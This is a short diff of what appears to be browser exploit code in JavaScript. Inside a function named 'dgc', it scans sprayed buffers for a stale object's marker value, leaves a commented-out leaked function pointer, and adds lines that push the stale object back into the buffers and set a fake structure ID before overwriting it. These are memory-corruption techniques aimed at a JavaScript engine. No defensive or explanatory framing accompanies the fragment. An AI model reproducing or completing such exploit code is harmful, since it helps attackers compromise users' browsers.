@@ -192,7 +192,6 @@ function dgc() {
  	//for (var z = 0; z < 0x1000; z++) fc();
 	//alert("After jitted code");
 	 
-	 
  	for (i = 0; i < bufs.length; i++) {
  		for (k = 0; k < bufs[0].length; k++) {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
@@ -204,6 +203,9 @@ function dgc() {
 				//stale[0] = fc;
  				//fcp = bufs[i][k];
 				//alert("Leaked function pointer:" + fcp)
+				
+                       		bufs.push(stale);
+				alert("Pushed stale");
 				
 				structID = 100;
 				stale[0] = {
